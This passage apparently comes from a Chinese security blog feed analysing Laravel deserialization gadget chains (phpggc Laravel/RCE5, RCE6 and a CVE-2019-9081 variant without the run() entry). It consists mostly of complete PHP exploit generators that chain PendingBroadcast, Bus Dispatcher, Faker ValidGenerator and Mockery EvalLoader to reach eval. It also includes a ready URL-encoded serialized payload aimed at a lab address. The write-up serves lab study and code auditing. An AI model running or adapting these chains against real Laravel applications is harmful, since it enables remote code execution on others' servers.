class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = <span class="keyword">new</span> \Illuminate\Bus\Dispatcher();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = <span class="keyword">new</span> \Illuminate\Broadcasting\BroadcastEvent();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BroadcastEvent</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = <span class="keyword">new</span> \Mockery\<span class="built_in">Generator</span>\MockDefinition();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span>&#123;</span><br><span class="line">        <span class="title">function</span> <span class="title">__construct</span>()</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;queueResolver = [new \Mockery\Loader\EvalLoader(), &#x27;load&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Loader</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">EvalLoader</span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">Mockery</span>\<span class="title">Generator</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">MockDefinition</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;code = <span class="string">&quot;&lt;?php phpinfo(); exit; ?&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;config = <span class="keyword">new</span> \Mockery\<span class="built_in">Generator</span>\MockConfiguration();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MockConfiguration</span></span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = <span class="string">&quot;a&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title">res</span> = <span class="title">new</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>\<span class="title">PendingBroadcast</span>();</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$res</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行代码中一定得有 exit ，不然会异常</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.136.167&#x2F;index.php&#x2F;user?user&#x3D;O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A25%3A%22Illuminate%5CBus%5CDispatcher%22%3A1%3A%7Bs%3A13%3A%22queueResolver%22%3Ba%3A2%3A%7Bi%3A0%3BO%3A25%3A%22Mockery%5CLoader%5CEvalLoader%22%3A0%3A%7B%7Di%3A1%3Bs%3A4%3A%22load%22%3B%7D%7Ds%3A8%3A%22%00%2A%00event%22%3BO%3A38%3A%22Illuminate%5CBroadcasting%5CBroadcastEvent%22%3A1%3A%7Bs%3A10%3A%22connection%22%3BO%3A32%3A%22Mockery%5CGenerator%5CMockDefinition%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00config%22%3BO%3A35%3A%22Mockery%5CGenerator%5CMockConfiguration%22%3A1%3A%7Bs%3A4%3A%22name%22%3Bs%3A1%3A%22a%22%3B%7Ds%3A7%3A%22%00%2A%00code%22%3Bs%3A25%3A%22%3C%3Fphp+phpinfo%28%29%3B+exit%3B+%3F%3E%22%3B%7D%7D%7D</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这里我是从exp推回去，再从后边又去推exp，可能看着比较乱，请见谅</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> laravel </tag>
            
            <tag> php </tag>
            
            <tag> 反序列化链 </tag>
            
            <tag> phpggc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>laravel/RCE6 反序列化</title>
      <link href="2021/04/21/laravel-RCE6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>2021/04/21/laravel-RCE6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>最近一直在搞 laravel 的反序列化链，吸收前辈的知识，这必然要来分析一下 phpggc 里面的链，搭起来的环境是 laravel 5.7 的，试了下，把可以影响的几条链都分析一下。</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>还是使用之前的入口，其他的没有改变，这里只做分析，不去考虑影响的范围，这是 phpggc 输出的相关信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Name           : Laravel/RCE6</span><br><span class="line">Version        : 5.5.*</span><br><span class="line">Type           : RCE (PHP code)</span><br><span class="line">Vector         : __destruct</span><br><span class="line">Informations   : </span><br><span class="line">Executes given PHP code through <span class="built_in">eval</span>().</span><br><span class="line">Requires Mockery, <span class="built_in">which</span> is <span class="keyword">in</span> the require-dev package.</span><br><span class="line"></span><br><span class="line">./phpggc Laravel/RCE6 &lt;code&gt;</span><br></pre></td></tr></table></figure><p>这里写的 5.5.* ，但实际上影响范围也不止这个</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>相对于 RCE5 来说，RCE6 只是多了一个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Illuminate\Support\MessageBag</span><br></pre></td></tr></table></figure><p>核心的代码执行的地方没有变，这个加的地方我也是没有看懂，希望有懂了的师傅能帮忙告诉一下</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Bus</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">queueResolver</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queueResolver = [<span class="keyword">new</span> \Mockery\Loader\EvalLoader(), <span class="string">&#x27;load&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$evilCode</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = <span class="keyword">new</span> \Illuminate\Bus\Dispatcher();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = <span class="keyword">new</span> BroadcastEvent(<span class="variable">$evilCode</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BroadcastEvent</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$connection</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$evilCode</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connection = <span class="keyword">new</span> \Mockery\<span class="built_in">Generator</span>\MockDefinition(<span class="variable">$evilCode</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Support</span> &#123;</span><br><span class="line">        <span class="title">class</span> <span class="title">MessageBag</span> &#123;</span><br><span class="line">                <span class="title">protected</span> $<span class="title">messages</span> = [];</span><br><span class="line">                <span class="keyword">protected</span> <span class="variable">$format</span>;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$inner</span></span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">$this</span>-&gt;format = <span class="variable">$inner</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Mockery</span>\<span class="title">Loader</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">EvalLoader</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">Mockery</span>\<span class="title">Generator</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">MockDefinition</span> &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">config</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$evilCode</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;code = <span class="variable">$evilCode</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;config = <span class="keyword">new</span> MockConfiguration();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MockConfiguration</span> </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$name</span> = <span class="string">&#x27;abcdefg&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $code = &#x27;&lt;?php phpinfo();exit;?&gt;&#x27;;</span><br><span class="line">    <span class="variable">$expected</span> = <span class="keyword">new</span> \Illuminate\Broadcasting\PendingBroadcast(<span class="variable">$code</span>);</span><br><span class="line">    <span class="variable">$res</span> = <span class="keyword">new</span> \Illuminate\Support\MessageBag(<span class="variable">$expected</span>);</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="variable">$res</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行代码中一定得有 exit ，不然会异常</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> laravel </tag>
            
            <tag> php </tag>
            
            <tag> 反序列化链 </tag>
            
            <tag> phpggc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>laravel5.7 反序列化 RCE复现2 注释run版</title>
      <link href="2021/04/19/laravel5-7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE%E5%A4%8D%E7%8E%B02%20%E6%B3%A8%E9%87%8Arun%E7%89%88/"/>
      <url>2021/04/19/laravel5-7-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE%E5%A4%8D%E7%8E%B02%20%E6%B3%A8%E9%87%8Arun%E7%89%88/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>本篇文章是继续上一篇文章，这也是之前某ctf里边出现过的题目，在 CVE-2019-9081 的基础上，删除了 run 入口</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>环境还是使用之前的，只是注释掉 __construct 中的 run()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;hasExecuted) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">## $this-&gt;run();</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>很明显，使用之前的 payload 肯定是不行了，我们就要寻找反序列化可以调用 run 的类，很难找到一个可以使用的 __destruct 中使用 call_user_func 的，因此，我们可以考虑使用 call，使用正则搜索</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__call\((.|\s)*call_user_func</span><br></pre></td></tr></table></figure><p>找到如下一个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vendor/fzaninotto/faker/src/Faker/ValidGenerator.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;generator, <span class="variable">$name</span>), <span class="variable">$arguments</span>);</span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$i</span> &gt; <span class="keyword">$this</span>-&gt;maxRetries) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">OverflowException</span>(sprintf(<span class="string">&#x27;Maximum retries of %d reached without finding a valid value&#x27;</span>, <span class="keyword">$this</span>-&gt;maxRetries));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (!call_user_func(<span class="keyword">$this</span>-&gt;validator, <span class="variable">$res</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们可以控制 $this-&gt;generator ，然后再找一个 __destruct ，存在调用的就可以，正则搜索</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__destruct\(</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过反序列化，我们可以让 $this-&gt;events 为 存在 __call 的类，在这里也就是 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Faker\ValidGenerator</span><br></pre></td></tr></table></figure><p>$this-&gt;event 可以随意写</p><p>这个类没有 dispatch 函数，就会调用 __call ，这里发现，大多数 call 都会使用 call_user_func(_array)，但参数name 是固定的，是被call的那个函数，一般是无法执行自己想要的函数的，这里我看了其他师傅的文章才弄明白，执行命令的关键点不是在这里，而是在下一个  call_user_func ，这里参考了 <a href="http://zeroyu.xyz/2020/06/28/Laravel-5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2019-9081-2020%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E9%A2%98%E8%A7%A3/">2020第五空间题解</a></p><p>但那篇文章中使用到的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Symfony\Component\Routing\Loader\Configurator\CollectionConfigurator</span><br></pre></td></tr></table></figure><p>这个类存在 __wakeup ，不允许反序列化，可能题目环境里边是可以用的？至少我这里是没有办法使用的，所以我用了 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Illuminate\Broadcasting\PendingBroadcast</span><br></pre></td></tr></table></figure><p>进入 Faker\ValidGenerator 的 __call ，由于存在这一句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array(array($this-&gt;generator, $name), $arguments);</span><br></pre></td></tr></table></figure><p>我们要保证不抛出异常，而 $name 这时候是 dispatch，那我们就找一个存在 dispatch 函数的类赋值给 generator ，这里有很多个，我找了这个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Events</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结合上一篇文章的分析，就可以写出exp</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$event</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$events</span>, <span class="variable">$event</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = <span class="variable">$event</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = <span class="variable">$events</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Events</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dispatcher</span></span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">ValidGenerator</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">generator</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$validator</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$validator</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;generator = <span class="keyword">new</span> \Illuminate\Events\Dispatcher();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;validator = <span class="variable">$validator</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;maxRetries = <span class="number">10000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Testing</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingCommand</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">test</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$app</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$command</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parameters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$test</span>, <span class="variable">$app</span>, <span class="variable">$command</span>, <span class="variable">$parameters</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;app = <span class="variable">$app</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;test = <span class="variable">$test</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;command = <span class="variable">$command</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parameters = <span class="variable">$parameters</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$default</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;default = <span class="variable">$default</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Application</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">bindings</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;bindings[<span class="string">&quot;Illuminate\Contracts\Console\Kernel&quot;</span>][<span class="string">&#x27;concrete&#x27;</span>] = <span class="string">&quot;Illuminate\Foundation\Application&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    </span><br><span class="line">    $<span class="title">defaultGenerator</span> = <span class="title">new</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>([1,2]);</span><br><span class="line">    <span 